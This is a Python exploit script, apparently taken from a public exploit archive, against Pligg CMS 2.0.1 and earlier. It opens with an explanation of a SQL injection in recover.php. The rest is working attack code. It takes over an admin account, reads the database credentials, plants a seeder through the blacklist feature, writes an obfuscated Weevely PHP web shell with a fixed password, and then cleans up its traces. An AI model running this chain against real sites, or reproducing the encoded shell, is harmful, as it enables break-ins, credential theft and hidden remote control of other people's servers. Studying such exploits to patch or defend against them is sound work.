#!/usr/bin/python
#
#
# Exploit Title:        Pligg <= 2.0.1 SQL Injection / PWD disclosure / RCE
# Author:               BlackHawk
# For base python code,
# thanks to my fiend:   The:Paradox
# Disclosure date:      24/07/2014
# Software Link:        http://www.pligg.com/
# 
# To Elena, thank you for the time spent.
# 
#
"""

#########     1. SQLInjection / User passord change        #########

Let's get some details, vuln it's pretty obvious , look at recover.php source: 
File: recover.php
----------------------------------------------------------
 
29.	$id=$_REQUEST['id'];
30.	$n=$_REQUEST['n'];
31.	$username=base64_decode($id);
32	$sql="SELECT * FROM `" . table_users . "` where `user_login` = '".$username."' AND `last_reset_request` = FROM_UNIXTIME('".$n."') AND user_level!='Spammer'";
[...]
61.	$to = $user->user_email;
62.	$subject = $main_smarty->get_config_vars("PLIGG_Visual_Name").' '.$main_smarty->get_config_vars("PLIGG_PassEmail_Subject");
63.
64.	$body = sprintf(
65.		$main_smarty->get_config_vars("PLIGG_PassEmail_PassBody"),
66.		$main_smarty->get_config_vars("PLIGG_Visual_Name"),
67.		$my_base_url . $my_pligg_base . '/login.php',
68.		$user->user_login,
69.		$password
70.	);
71.
72.	$headers = 'From: ' . $main_smarty->get_config_vars("PLIGG_PassEmail_From") . "\r\n";
73.	$headers .= "Content-type: text/html; charset=utf-8\r\n";
74.
75.	if (!mail($to, $subject, $body, $headers))
76.	{
77.		$saltedPass = generateHash($password);
78.		$db->query('UPDATE `' . table_users . "` SET `user_pass` = '$saltedPass' WHERE `user_login` = '".$user->user_login."'");
79.		$db->query('UPDATE `' . table_users . '` SET `last_reset_request` = FROM_UNIXTIME('.time().') WHERE `user_login` = "'.$user->user_login.'"');
80.
81.		$current_user->Authenticate($user->user_login, $password);
[...]

----------------------------------------------------------

Thanks to the base64_decode there are no problems of magic_quotes or whatever, but as an mail must be sent for the password to be reset, you have to totally take control of the query so no sospicious notifications will be sent.
To prevent sending clear data & quotes with the request, I'll not use $n variable, resulting in a longer and less fancy SQLInj.

Now that we are admin we use our power to:
[+] get database data from dbsettings.php
[+] plant some code to upload a post-exploitation Weevely shell

Code it's very dirty but works :)
"""

import urllib, urllib2, base64, re
from time import sleep
from sys import argv
from cookielib import CookieJar
print """
#=================================================================#
#                         Pligg <= 2.0.1                          #
#                    Sqli / Source leak / RCE                     #
#                   Priviledge Escalation Exploit                 #
#                                                                 #
#                                                                 #
#                 _____  _  _____                                 #
#                (___  \( )/  ___)                                #
#                  (___ | | ___)                                  # 
#                     /"| ("\          Experientia senum,         #
#                    ( (| |) )          agilitas iuvenum.         #
#                     `.!' .'                                     #
#                      / .'\            Adversa fortiter.         #
#                      \|/ /             Dubia prudenter.         #
#                       /.<                                       #
#                      (| |)                                      #
#                       | '                                       #
#                       `-'   VK                                  #
#                                                                 #
#=================================================================#
# Usage:                                                          #
#  ./Exploit [Target] [Path] [Username]                           #
#                                                                 #
# Example:                                                        #
#  ./Exploit 127.0.0.1 /pligg/                                    #
#  ./Exploit www.host.com /                                       #
#=================================================================#
# email: hawkgotyou[at]gmail[dot]com                    BlackHawk #
#=================================================================#
"""

 
if len(argv) <= 3: exit()
 
 
port = 80
 
target = argv[1]
path = argv[2]
uname = argv[3]
 
cj = CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
formdata = {"reg_password" : "random",
			"reg_password2" : "random",
			"n" : "123",
			"processrecover" : "1",
			"id" : base64.b64encode(b"mrcongiuntivo' UNION SELECT 1,(SELECT user_login FROM pligg_users WHERE user_level='admin' LIMIT 1),3,4,5,6,'sodoma () mailinator com',8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8 UNION SELECT 1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8 FROM pligg_users WHERE user_login = 'warum")
		}
data_encoded = urllib.urlencode(formdata)
print "[+] Sending the reset password request for user "+ uname
response = opener.open("http://" + target + path +"recover.php", data_encoded)
content = response.read()
print "[+] Heading to admin panel and activating anti-spam"
response = opener.open("http://" + target + path +"admin/admin_config.php?action=save&var_id=12&var_value=true")
content = response.read()
print "[+] Setting a new blacklist file"
response = opener.open("http://" + target + path +"admin/admin_config.php?action=save&var_id=14&var_value=libs/dbconnect.php")
content = response.read()
print "[+] Retrieving DB connection details"
response = opener.open("http://" + target + path +"admin/domain_management.php")
content = response.read()
regex = re.compile("define\(\"([A-Z_]+?)\", '(.*?)'\)")
print regex.findall(content)
print "[+] Preparing dbconnection.php for shell injection.."
response = opener.open("http://" + target + path +"admin/domain_management.php?id=0&list=blacklist&remove=?%3E")
content = response.read()
print "[+] Time for some shell planting, preparing file_put_contents.."
seed = "IF(ISSET($_GET[WHR])){FILE_PUT_CONTENTS(STRIPSLASHES($_GET[WHR]),STRIPSLASHES($_GET[WHT]), FILE_APPEND);}CHMOD($_GET[WHR],0777);"
response = opener.open("http://" + target + path +"admin/domain_management.php?id=&doblacklist="+seed)
content = response.read()
print "[+] Injecting weevely.php [ https://github.com/epinna/Weevely/ ] with pwd: peekaboo"
weevely = """


<?php /**/
$ozyv="XBsYWNlKGFycmF5KCcvW15cdz1czrc10vJywnL1xzLycpLCBhcnJheSgnzrJyzrwnKycpLzrCBq";
$lphb="b2luKGFzrycmF5X3NsaWzrNlKzrCRhLCRjKCRhKS0zKSkpKzrSzrk7ZzrWNobyAzrnPCzr8nLiRrLiczr+Jzt9";
$jrtc="JGM9J2NvzrdW50JzskYT0kX0NPT0tJRTtpZihyZzrXNldCgkYSk9PSdwZScgJiYgzrJGMzroJGEpPjMpzreyRr";
$xxhr=str_replace("h","","shthrh_hrehphlahche");
$yuwd="PSdla2Fib28zrnzrO2zrVjaG8gJzwnLiRrLic+JztldmFzrsKGzrJhc2U2NF9kZWNvZGUocHJlZ19yZ";
$bzrj=$xxhr("oo","","booaoosooeoo6oo4_dooeoocooooodooe");
$atkr=$xxhr("b","","cbrebatbeb_bfbunbctbion");
$ajbi=$atkr("",$bzrj($xxhr("zr","",$jrtc.$yuwd.$ozyv.$lphb)));$ajbi();
 ?>"""
for wl in weevely.splitlines():
		formdata = {"WHR" : "weevely.php",
			"WHT" : wl
		}
		data_encoded = urllib.urlencode(formdata)
		response = opener.open("http://" + target + path +"admin/admin_delete_comments.php?"+data_encoded)
		content = response.read()
		sleep(4)
print "[+] Cleaning up the seeder.."
response = opener.open("http://" + target + path +"admin/domain_management.php?id=0&list=blacklist&remove="+seed)
content = response.read()
print "[+] Resetting the blacklist file.."
response = opener.open("http://" + target + path +"admin/admin_config.php?action=save&var_id=14&var_value=logs/domain-blacklist.log")
content = response.read()
print """
#=================================================================#
Shell is [ http://"""+host+path+"""/admin/weevely.php ]
#=================================================================#
Access is via Weevely Python script

"""
